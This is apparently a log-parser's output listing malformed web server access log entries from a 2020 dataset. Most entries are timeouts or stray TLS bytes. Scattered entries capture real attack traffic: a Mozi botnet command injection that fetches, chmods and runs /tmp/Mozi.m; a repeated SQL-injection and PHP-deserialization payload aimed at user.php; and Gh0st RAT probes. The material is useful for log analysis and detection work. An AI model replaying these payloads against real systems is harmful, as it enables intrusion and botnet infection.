#  - - [22/Jul/2020:12:42:07 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [22/Jul/2020:12:43:16 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [22/Jul/2020:12:46:35 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [22/Jul/2020:12:52:24 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [22/Jul/2020:23:01:59 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_22-23_7.log
# -------line did not match expected format ---------
#  - - [23/Nov/2020:09:49:18 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [23/Nov/2020:13:45:28 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [23/Nov/2020:14:45:59 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [23/Nov/2020:14:48:01 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [23/Nov/2020:14:50:08 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [23/Nov/2020:15:05:15 +0000] "-" 408 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_23-24_11.log
# -------line did not match expected format ---------
#  - - [23/Jul/2020:15:14:59 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Jul/2020:05:01:58 +0000] "POST /%75%73%65%72%2e%70%68%70 HTTP/1.1" 404 1872 "45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:\"num\";s:147:\"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b24524345275d3b6469652f2a2a2f286d6435284449524543544f52595f534550415241544f5229293b2f2f7d7d,0--\";s:2:\"id\";s:9:\"' union/*\";s:4:\"name\";s:3:\"ads\";}45ea207d7a2b68c49582d2d22adf953a" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
#
# -------line did not match expected format ---------
#  - - [24/Jul/2020:05:43:24 +0000] "Gh0st\xad" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_23-24_7.log
# -------line did not match expected format ---------
#  - - [24/Nov/2020:06:39:43 +0000] "\n" 400 1531 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:06:39:45 +0000] "\n" 400 1547 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:06:39:45 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:06:39:46 +0000] "\n" 400 1732 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:06:39:46 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:06:39:46 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:06:39:53 +0000] "\n" 400 1967 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:08:29:31 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:08:43:18 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:08:49:45 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:08:54:48 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:10:13:38 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:10:19:44 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:10:20:59 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:10:23:57 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:10:24:23 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:10:26:37 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:10:32:27 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:10:32:42 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:10:33:42 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:10:33:45 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:10:35:26 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:10:37:18 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:10:43:52 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:15:42:02 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:15:49:38 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Nov/2020:15:52:54 +0000] "-" 408 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_24-25_11.log
# -------line did not match expected format ---------
#  - - [24/Jul/2020:07:23:56 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Jul/2020:08:24:13 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [24/Jul/2020:15:24:11 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_24-25_7.log
# -------line did not match expected format ---------
#  - - [25/Nov/2020:09:20:32 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Nov/2020:09:28:22 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Nov/2020:09:30:56 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Nov/2020:09:33:46 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Nov/2020:09:33:46 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Nov/2020:09:36:58 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Nov/2020:09:38:17 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Nov/2020:09:42:34 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Nov/2020:09:46:30 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Nov/2020:10:47:49 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Nov/2020:10:52:06 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Nov/2020:10:53:53 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Nov/2020:12:09:36 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Nov/2020:12:12:55 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Nov/2020:20:31:13 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Nov/2020:20:32:58 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Nov/2020:20:34:47 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Nov/2020:20:40:22 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Nov/2020:20:42:19 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Nov/2020:20:44:55 +0000] "-" 408 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_25-26_11.log
# -------line did not match expected format ---------
#  - - [25/Jul/2020:08:59:16 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [25/Jul/2020:13:09:59 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Jul/2020:02:02:14 +0000] "\x16\x03\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Jul/2020:02:02:18 +0000] "\x16\x03\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Jul/2020:02:02:24 +0000] "\x16\x03\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Jul/2020:02:16:37 +0000] "\n" 400 1531 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Jul/2020:02:16:39 +0000] "\n" 400 1547 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Jul/2020:02:16:40 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Jul/2020:02:16:41 +0000] "\n" 400 1732 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Jul/2020:02:16:41 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Jul/2020:02:16:42 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Jul/2020:05:58:42 +0000] "\x16\x03\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Jul/2020:05:58:42 +0000] "\x16\x03\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Jul/2020:05:58:44 +0000] "\x16\x03\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_25-26_7.log
# -------line did not match expected format ---------
#  - - [26/Nov/2020:07:31:11 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Nov/2020:07:31:11 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Nov/2020:08:43:27 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Nov/2020:08:43:27 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Nov/2020:08:50:40 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Nov/2020:08:59:13 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Nov/2020:09:02:41 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Nov/2020:09:04:54 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Nov/2020:09:11:39 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Nov/2020:09:31:25 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Nov/2020:12:36:58 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Nov/2020:15:37:11 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [26/Nov/2020:17:57:43 +0000] "-" 408 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_26-27_11.log
# -------line did not match expected format ---------
#  - - [26/Jul/2020:07:02:01 +0000] "POST /%75%73%65%72%2e%70%68%70 HTTP/1.1" 404 1872 "554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\"id\";s:3:\"'/*\";s:3:\"num\";s:141:\"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24524345275d3b6469652f2a2a2f286d6435284449524543544f52595f534550415241544f5229293b2f2f7d7d,0--\";s:4:\"name\";s:3:\"ads\";}554fcae493e564ee0dc75bdf2ebf94ca" - "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
#
# -------line did not match expected format ---------
#  - - [26/Jul/2020:07:02:23 +0000] "POST /%75%73%65%72%2e%70%68%70 HTTP/1.1" 404 1872 "45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:\"num\";s:147:\"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b24524345275d3b6469652f2a2a2f286d6435284449524543544f52595f534550415241544f5229293b2f2f7d7d,0--\";s:2:\"id\";s:9:\"' union/*\";s:4:\"name\";s:3:\"ads\";}45ea207d7a2b68c49582d2d22adf953a" - "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
#
# -------line did not match expected format ---------
#  - - [26/Jul/2020:13:02:20 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [27/Jul/2020:02:34:52 +0000] "POST /%75%73%65%72%2e%70%68%70 HTTP/1.1" 404 1872 "45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:\"num\";s:147:\"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b24524345275d3b6469652f2a2a2f286d6435284449524543544f52595f534550415241544f5229293b2f2f7d7d,0--\";s:2:\"id\";s:9:\"' union/*\";s:4:\"name\";s:3:\"ads\";}45ea207d7a2b68c49582d2d22adf953a" - "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_26-27_7.log
# -------line did not match expected format ---------
#  - - [27/Nov/2020:07:56:46 +0000] "\n" 400 1531 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [27/Nov/2020:07:56:47 +0000] "\n" 400 1547 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [27/Nov/2020:07:56:47 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [27/Nov/2020:07:56:47 +0000] "\n" 400 1732 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [27/Nov/2020:07:56:48 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [27/Nov/2020:07:56:48 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [28/Nov/2020:01:17:49 +0000] "\n" 400 1531 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [28/Nov/2020:01:17:51 +0000] "\n" 400 1547 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [28/Nov/2020:01:17:51 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [28/Nov/2020:01:17:52 +0000] "\n" 400 1732 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [28/Nov/2020:01:17:53 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [28/Nov/2020:01:17:54 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [28/Nov/2020:01:18:09 +0000] "\n" 400 1967 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [28/Nov/2020:01:18:34 +0000] "-" 408 1525 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_27-28_11.log
# -------line did not match expected format ---------
#  - - [28/Jul/2020:01:00:17 +0000] "POST /%75%73%65%72%2e%70%68%70 HTTP/1.1" 404 1872 "554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\"id\";s:3:\"'/*\";s:3:\"num\";s:141:\"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24524345275d3b6469652f2a2a2f286d6435284449524543544f52595f534550415241544f5229293b2f2f7d7d,0--\";s:4:\"name\";s:3:\"ads\";}554fcae493e564ee0dc75bdf2ebf94ca" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_27-28_7.log
# done for  ../dataset/phase2/data/web_logs/humans/access_28-29_11.log
# -------line did not match expected format ---------
#  - - [28/Jul/2020:11:17:38 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [28/Jul/2020:13:08:56 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_28-29_7.log
# -------line did not match expected format ---------
#  - - [29/Nov/2020:15:36:21 +0000] "Gh0st\xad" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Nov/2020:19:13:04 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Nov/2020:19:13:04 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Nov/2020:19:14:49 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Nov/2020:19:23:44 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Nov/2020:21:44:56 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [29/Nov/2020:21:48:26 +0000] "-" 408 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_29-30_11.log
# -------line did not match expected format ---------
#  - - [29/Jul/2020:12:39:18 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [30/Jul/2020:02:57:31 +0000] "\n" 400 1531 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [30/Jul/2020:02:57:36 +0000] "\n" 400 1547 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [30/Jul/2020:02:57:36 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [30/Jul/2020:02:57:37 +0000] "\n" 400 1732 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [30/Jul/2020:02:57:42 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [30/Jul/2020:02:57:43 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [30/Jul/2020:02:58:10 +0000] "\n" 400 1967 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [30/Jul/2020:02:58:36 +0000] "-" 408 1525 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_29-30_7.log
# -------line did not match expected format ---------
#  - - [03/Aug/2020:12:28:34 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_3-4_8.log
# -------line did not match expected format ---------
#  - - [30/Jul/2020:12:29:33 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [31/Jul/2020:02:00:13 +0000] "POST /%75%73%65%72%2e%70%68%70 HTTP/1.1" 404 1872 "554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\"id\";s:3:\"'/*\";s:3:\"num\";s:141:\"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24524345275d3b6469652f2a2a2f286d6435284449524543544f52595f534550415241544f5229293b2f2f7d7d,0--\";s:4:\"name\";s:3:\"ads\";}554fcae493e564ee0dc75bdf2ebf94ca" - "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_30-31_7.log
# -------line did not match expected format ---------
#  - - [30/Nov/2020:08:14:10 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [30/Nov/2020:08:36:51 +0000] "\n" 400 1531 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [30/Nov/2020:08:36:53 +0000] "\n" 400 1547 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [30/Nov/2020:08:36:54 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [30/Nov/2020:08:36:56 +0000] "\n" 400 1732 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [30/Nov/2020:08:36:57 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [30/Nov/2020:08:36:59 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [30/Nov/2020:12:07:58 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [30/Nov/2020:16:29:40 +0000] "-" 408 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_30_1_12.log
# -------line did not match expected format ---------
#  - - [31/Jul/2020:12:19:38 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_31_7-1_8.log
# -------line did not match expected format ---------
#  - - [04/Aug/2020:09:46:09 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [04/Aug/2020:09:48:04 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [04/Aug/2020:10:00:28 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [04/Aug/2020:10:01:58 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [04/Aug/2020:11:28:11 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [04/Aug/2020:11:30:37 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [04/Aug/2020:11:31:56 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [04/Aug/2020:11:36:01 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [04/Aug/2020:11:37:42 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [04/Aug/2020:11:40:46 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [04/Aug/2020:11:42:06 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [04/Aug/2020:11:44:13 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [04/Aug/2020:12:11:51 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_4-5_8.log
# done for  ../dataset/phase2/data/web_logs/humans/access_5-6_7.log
# -------line did not match expected format ---------
#  - - [05/Aug/2020:12:20:32 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [05/Aug/2020:22:59:03 +0000] "\n" 400 1531 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [05/Aug/2020:22:59:05 +0000] "\n" 400 1547 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [05/Aug/2020:22:59:07 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [05/Aug/2020:22:59:07 +0000] "\n" 400 1732 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [05/Aug/2020:22:59:09 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [05/Aug/2020:22:59:11 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [05/Aug/2020:22:59:27 +0000] "\n" 400 1967 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [05/Aug/2020:22:59:53 +0000] "-" 408 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [06/Aug/2020:03:32:45 +0000] "\x16\x03\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [06/Aug/2020:03:32:50 +0000] "\x16\x03\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [06/Aug/2020:03:32:52 +0000] "\x16\x03\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [06/Aug/2020:04:01:44 +0000] "POST /%75%73%65%72%2e%70%68%70 HTTP/1.1" 404 1872 "554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\"id\";s:3:\"'/*\";s:3:\"num\";s:141:\"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24524345275d3b6469652f2a2a2f286d6435284449524543544f52595f534550415241544f5229293b2f2f7d7d,0--\";s:4:\"name\";s:3:\"ads\";}554fcae493e564ee0dc75bdf2ebf94ca" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
#
# -------line did not match expected format ---------
#  - - [06/Aug/2020:04:24:39 +0000] "\n" 400 1531 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [06/Aug/2020:04:24:42 +0000] "\n" 400 1547 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [06/Aug/2020:04:24:43 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [06/Aug/2020:04:24:46 +0000] "\n" 400 1732 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [06/Aug/2020:04:24:47 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [06/Aug/2020:04:24:48 +0000] "\n" 400 1525 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [06/Aug/2020:04:25:08 +0000] "\n" 400 1967 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [06/Aug/2020:04:25:35 +0000] "-" 408 1525 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_5-6_8.log
# -------line did not match expected format ---------
#  - - [06/Jul/2020:06:46:13 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [06/Jul/2020:06:56:07 +0000] "-" 408 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [06/Jul/2020:07:46:43 +0000] "-" 408 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_6-7_7.log
# -------line did not match expected format ---------
#  - - [06/Aug/2020:12:12:55 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_6-7_8.log
# -------line did not match expected format ---------
#  - - [07/Jul/2020:09:39:39 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [07/Jul/2020:17:49:41 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [08/Jul/2020:00:22:55 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [08/Jul/2020:02:30:59 +0000] "\x16\x03\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [08/Jul/2020:02:31:00 +0000] "\x16\x03\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [08/Jul/2020:02:31:04 +0000] "\x16\x03\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_7-8_7.log
# -------line did not match expected format ---------
#  - - [07/Aug/2020:11:52:23 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_7-8_8.log
# -------line did not match expected format ---------
#  - - [08/Jul/2020:06:31:25 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [08/Jul/2020:06:52:31 +0000] "POST /%75%73%65%72%2e%70%68%70 HTTP/1.1" 404 1872 "554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\"id\";s:3:\"'/*\";s:3:\"num\";s:141:\"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24524345275d3b6469652f2a2a2f286d6435284449524543544f52595f534550415241544f5229293b2f2f7d7d,0--\";s:4:\"name\";s:3:\"ads\";}554fcae493e564ee0dc75bdf2ebf94ca" - "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
#
# -------line did not match expected format ---------
#  - - [08/Jul/2020:08:32:48 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [08/Jul/2020:13:08:03 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [09/Jul/2020:00:40:32 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_8-9_7.log
# -------line did not match expected format ---------
#  - - [08/Aug/2020:12:09:28 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_8-9_8.log
# -------line did not match expected format ---------
#  - - [09/Aug/2020:12:05:17 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
